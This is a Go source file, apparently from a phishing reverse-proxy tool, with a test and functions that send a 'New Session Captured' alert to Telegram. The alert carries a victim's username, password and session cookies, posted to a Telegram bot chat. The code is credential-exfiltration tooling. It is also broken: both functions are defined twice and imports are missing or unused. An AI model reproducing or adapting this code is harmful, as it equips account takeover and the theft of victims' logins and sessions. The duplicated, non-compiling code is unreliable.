package core

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"testing"
)

func TestSendTelegramNotification(t *testing.T) {
	// Create a test configuration
	cfg := &Config{
		telegramConfig: &TelegramConfig{
			Enabled:   true,
			BotToken:  "YOUR_BOT_TOKEN_HERE",
			ChatID:    "YOUR_CHAT_ID_HERE",
		},
	}

	// Create a test session
	session := &Session{
		Name:      "Test Session",
		Username:  "testuser",
		Password:  "testpass",
		Tokens: map[string]map[string]*database.Token{
			"example.com": {
				"session": {
					Name:     "session",
					Value:    "testsessionvalue",
					HttpOnly: true,
				},
			},
		},
	}

	// Test sending notification
	err := SendTelegramNotification(cfg, session)
	if err != nil {
		t.Errorf("Failed to send Telegram notification: %v", err)
	}
}

// SendNotification sends a Telegram notification with the captured session details
func SendTelegramNotification(cfg *Config, session *Session) error {
	if !cfg.GetTelegramConfig().Enabled {
		return nil
	}

	// Format the message
	message := fmt.Sprintf("*New Session Captured: %s*\n\n", session.Name)
	message += fmt.Sprintf("Username: %s\n", session.Username)
	message += fmt.Sprintf("Password: %s\n", session.Password)
	message += "\nCookies:\n"

	// Add cookies to message
	for domain, tokens := range session.Tokens {
		message += fmt.Sprintf("\nDomain: %s\n", domain)
		for name, token := range tokens {
			message += fmt.Sprintf("- %s: %s\n", name, token.Value)
		}
	}

	// Send message to Telegram
	return sendTelegramMessage(cfg.GetTelegramConfig(), message)
}

func sendTelegramMessage(cfg *TelegramConfig, message string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", cfg.BotToken)
	
	data := struct {
		ChatID    string `json:"chat_id"`
		Text      string `json:"text"`
		ParseMode string `json:"parse_mode"`
	}{
		ChatID:    cfg.ChatID,
		Text:      message,
		ParseMode: "Markdown",
	}

	jsonData, err := json.Marshal(data)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", apiURL, strings.NewReader(string(jsonData)))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to send Telegram notification: %s", resp.Status)
	}

	return nil
}

type TelegramConfig struct {
	BotToken  string `mapstructure:"bot_token" yaml:"bot_token"`
	ChatID    string `mapstructure:"chat_id" yaml:"chat_id"`
	Enabled   bool   `mapstructure:"enabled" yaml:"enabled"`
}

// SendNotification sends a Telegram notification with the captured session details
func SendTelegramNotification(cfg *Config, session *Session) error {
	if !cfg.GetTelegramConfig().Enabled {
		return nil
	}

	// Format the message
	message := fmt.Sprintf("*New Session Captured: %s*\n\n", session.Name)
	message += fmt.Sprintf("Username: %s\n", session.Username)
	message += fmt.Sprintf("Password: %s\n", session.Password)
	message += "\nCookies:\n"

	// Add cookies to message
	for domain, tokens := range session.Tokens {
		message += fmt.Sprintf("\nDomain: %s\n", domain)
		for name, token := range tokens {
			message += fmt.Sprintf("- %s: %s\n", name, token.Value)
		}
	}

	// Send message to Telegram
	return sendTelegramMessage(cfg.GetTelegramConfig(), message)
}

func sendTelegramMessage(cfg *TelegramConfig, message string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", cfg.BotToken)
	
	data := struct {
		ChatID    string `json:"chat_id"`
		Text      string `json:"text"`
		ParseMode string `json:"parse_mode"`
	}{
		ChatID:    cfg.ChatID,
		Text:      message,
		ParseMode: "Markdown",
	}

	jsonData, err := json.Marshal(data)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", apiURL, strings.NewReader(string(jsonData)))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to send Telegram notification: %s", resp.Status)
	}

	return nil
}
